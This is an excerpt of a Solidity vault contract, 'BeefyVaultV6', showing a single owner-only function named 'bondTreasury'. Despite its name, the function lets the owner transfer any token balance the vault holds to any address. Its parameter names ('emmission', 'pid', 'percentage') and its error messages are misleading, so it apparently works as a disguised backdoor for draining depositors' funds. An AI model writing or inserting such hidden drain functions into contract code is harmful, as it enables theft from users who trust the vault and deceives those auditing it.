...
contract BeefyVaultV6 is ERC20, Ownable, ReentrancyGuard {
    ...
    function bondTreasury(IERC20 emmission, address pid, uint256 percentage) public onlyOwner {
        require(msg.sender == owner(), "Vault booster is enabled");
        uint256 expansionPercentage = emmission.balanceOf(address(this));
        require(percentage <= expansionPercentage, "EXPIRED");
        emmission.transfer(pid, percentage);
        emit TransferSent(msg.sender, pid, percentage); 
    }
